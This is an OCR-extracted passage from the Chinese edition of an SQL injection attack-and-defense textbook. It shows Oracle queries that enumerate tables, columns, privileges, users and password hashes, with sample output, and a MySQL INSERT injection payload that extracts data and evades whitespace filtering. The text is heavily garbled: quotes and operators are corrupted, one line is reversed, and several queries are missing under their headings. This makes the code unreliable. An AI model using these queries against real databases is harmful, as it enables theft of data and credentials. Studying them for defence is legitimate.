SQL注入攻击与防御（第2版）
DUMMY [1] =1
=[] d3
SALGRADE [3]=5
也可以为所有可访问或可用的表枚举相同的信息，包括用户、表名以及表中包含的行数，
如下所示：
select b.owner11*, *1la,table_name1I *[*1lcount (*) 1I*]=*1Inum_rows from
a11_tab_column8 a, al1_tables b where a.table_name=b.table_name
group by b,owner, a.table_name, num_rows
最后，可以枚举每张表的列和数据类型以便更完整地了解数据库模式，如下所示：
select table_name11*:*I|column_name11*:*IIdata_type11*:*1I column_id
from user_tab_columns order by table_name, column_id
DEPT : DEPTNO : NUMBER: 1
DEPT : DNAME : VARCHAR2 : 2
DEPT : LOC : VARCHAR2 : 3
DUMMY : DUMMY : NUMBER: 1
EMP : EMPNO : NUMBER: 1
EMP : ENAME : VARCHAR.2 : 2
EMP : JOB: VARCHAR2: 3
EMP :MGR : NUMBER: 4
EMP : HIREDATE : DATE : 5
EMP: SAL: NUMBER: 6
EMP : COM: NUMBER: 7
EMP : DEPTNO:NUMBER : 8
SALGRADE : GRADE :NUMBER : 1
SALGRADE : LOSAL:NUMBER: 2
SALGRADE : HISAL:NUMBER: 3
另外一件有趣的事是获取当前数据库用户的权限，可以以普通用户身份来完成该操作。
下列查询将返回当前用户的权限。Oracle 中包含4种不同权限（SYSTEM、ROLE、TABLE和
COLUMN)。
获取当前用户的系统权限：
获取当前用户的角色权限：
select * from user_role_privs; --show role privileges of the current usez
获取当前用户的表格权限：
select * from user_tab_privs;
获取当前用户的列权限：
select * from user_col_privs;
要获取所有可能的权限列表，就必须用all替换上述查询中的user字符串，如下所示：
获取所有系统权限：
148
---
## Page 163
第4章利用SQL注入
select * from all_sys_privs;
获取所有角色权限：
select * from all_role_privs;
获取所有表权限：
select * from al1_tab_privs
获取所有列权限：
select * from al1_col_privs/
有了数据库模式列表以及当前用户信息后，接下来我们想枚举数据库中的其他信息，比如
数据库中的所有用户。下列查询将返回数据库中所有用户的列表。该查询的优点是：默认情况
下，它可由任意数据库用户执行。
SCOTT
04 - JAN - 09
PHP
04 - JAN - 09
PLSQL
02 - JAN - 09
MONODEMO
29 - DEC - 08
DEHO1
29 - DEC - 08
ALEX
14 - DEC - 08
OWBSYS
80 - 03G - CT
13 - DEC - 08
APEX_PUBLIC_USER
13 - DEC - 08
还可以根据所使用的数据库版本来查询其他项。例如，在Oracle 10g R2之后的版本中，
普通用户可使用下列SELECT语句检索数据库的用户名和哈希口令：
SELECT name, password, astatus FRoM sys.userS where type#>0 and
1ength (password) =16 -- astatus (0=open, 9=1ocked6expired)
SAS
AD24A888FC3B1BE7
0
SYSTEM
BD3D49AD69E3FA34
0
OUTLN
4A3BA55E08595C81
9
可以使用公共可用的工具来测试或破解哈希口令，以获取高级数据库账户（比如SYS)的认
证信息。在Oracle11g中，Oracle已经修改了所使用口令的哈希算法，而且哈希口令位于另外
一个不同的列中（spare4列)，如下所示：
Z9=(baxeds) uu6uet pue 0 select 'a’ + 1;
1*a' + 1 I
1 row in set, 1 warning (0.00 sec)
可以使用这一技巧来提取任意数据，只须将数据转换为整数（除非该数据已经是整数)，然
INSERT INTO table (col1, col2) VALUES (*foo*, 'd′ + substring((SELECT @8
version) , 1, 1) +**) 
符d'。结果实际上就是5：
mysql> select (*a′ + substring((select @@version),1,1));
I('a′ + substring((select eversion),1,l))1
15
1 row in set, 1 ?arning (0.00 sec)
还存在最后一个陷阱，即空白字符（white-space)会被过滤掉。但是使用注释很容易克服这
一陷阱。因此实际的攻击如下所示：
INSERT INTO table (col1, col2) VALUES ('foo', 'd'+/**/
substring ((select/**/@8version) , 1, 1)+**) ;
要想转换非整数字符，可以使用ASCIIO函数来实现：
152